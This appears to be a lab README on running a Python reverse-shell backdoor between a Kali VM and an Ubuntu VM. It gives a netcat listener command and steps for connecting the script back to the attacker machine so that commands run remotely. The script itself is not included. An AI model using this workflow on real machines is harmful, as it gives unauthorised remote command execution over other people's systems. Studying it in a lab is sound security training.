### Running the Backdoor Program

1. **On Kali Machine**:
   - Open a terminal on your Kali machine.
   - Start a netcat listener to wait for incoming connections:
   
	```bash
	nc -v -l -p 5555
	```

2. **Prepare Ubuntu Machine**:
   - Save the Python script as `backdoor.py` on the Ubuntu machine.
   - Ensure Python 3 is installed on the Ubuntu machine.
   - To run the script, modify the `kali_ip` variable in the script to match the IP address of your Kali VM.
   - Open terminal and run the script using Python 3:

 	```bash
	python3 backdoor.py
	```

3. **Interact with the Backdoor**:
   - Using the netcat terminal on the Kali machine to send commands.
   - Commands will be executed on the Ubuntu machine, and results will be displayed in the netcat terminal.
   - To test, type:

 	```bash
	ls
	```
        or

 	```bash
	pwd
	```

   - To close the connection, type:

 	```bash
	&
	```